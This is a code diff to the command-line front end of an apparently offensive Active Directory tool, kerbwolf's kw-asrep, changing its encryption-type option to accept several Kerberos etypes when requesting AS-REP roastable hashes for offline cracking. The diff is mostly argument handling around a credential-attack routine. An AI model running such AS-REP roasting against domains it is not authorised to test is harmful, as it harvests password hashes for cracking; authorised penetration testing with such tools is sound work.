@@ -8,10 +8,10 @@ import sys
 
 from kerbwolf import __version__
 from kerbwolf.attacks.asreproast import asreproast
-from kerbwolf.cli._common import collect_targets, ldap_connect_from_args, ldap_discover_all_users, output_results, print_header, resolve_context
+from kerbwolf.cli._common import collect_targets, ldap_connect_from_args, ldap_discover_all_users, output_results, parse_etypes, print_header, resolve_context
 from kerbwolf.core.ldap import find_asreproastable
 from kerbwolf.log import Logger
-from kerbwolf.models import ETYPE_BY_NAME, HashFormat, KerberosContext, KerbWolfError, TransportProtocol
+from kerbwolf.models import HashFormat, KerberosContext, KerbWolfError, TransportProtocol
 
 
 def _build_parser() -> argparse.ArgumentParser:
@@ -67,7 +67,7 @@ def _build_parser() -> argparse.ArgumentParser:
 
     # -- Output --
     grp = parser.add_argument_group("output")
-    grp.add_argument("-e", "--enctype", choices=["des-cbc-crc", "des-cbc-md5", "rc4", "aes128", "aes256"], default="rc4", help="Encryption type (default: rc4)")
+    grp.add_argument("-e", "--enctype", action="append", metavar="ETYPE", default=None, help="Encryption type(s) in preference order, repeatable or comma-separated (choices: des-cbc-crc, des-cbc-md5, rc4, aes128, aes256; default: rc4)")
     grp.add_argument("-o", "--output", metavar="FILE", help="Write hashes to file")
     grp.add_argument("--format", choices=["hashcat", "john"], default="hashcat", dest="hash_format", help="Hash output format (default: hashcat)")
 
@@ -115,7 +115,7 @@ def main(argv: list[str] | None = None) -> None:
 
     targets = list(dict.fromkeys(targets))
 
-    etype = ETYPE_BY_NAME[args.enctype]
+    etypes = parse_etypes(args.enctype)
     transport = TransportProtocol(args.transport)
     hash_format = HashFormat(args.hash_format)
 
@@ -125,13 +125,14 @@ def main(argv: list[str] | None = None) -> None:
         target_desc += " (LDAP)"
     elif args.ldap_all:
         target_desc += " (LDAP spray)"
+    etype_desc = ", ".join(e.name for e in etypes)
     print_header(
         "kw-asrep",
         [
             ("Attack", "AS-REP Roast"),
             ("Domain", ctx.domain),
             ("DC", f"{ctx.dc_hostname} ({ctx.dc_ip})" if ctx.dc_hostname else ctx.dc_ip),
-            ("Etype", etype.name),
+            ("Etype", etype_desc),
             ("Targets", target_desc),
             ("Transport", transport.value),
             ("Format", hash_format.value),
@@ -139,13 +140,13 @@ def main(argv: list[str] | None = None) -> None:
         ],
     )
 
-    logger.info("AS-REP Roast (etype: %s, targets: %d)", etype.name, len(targets))
+    logger.info("AS-REP Roast (etypes: %s, targets: %d)", etype_desc, len(targets))
 
     try:
         results = asreproast(
             domain=ctx.domain,
             dc_ip=ctx.dc_ip,
-            etype=etype,
+            etypes=etypes,
             target_users=targets,
             hash_format=hash_format,
             transport=transport,
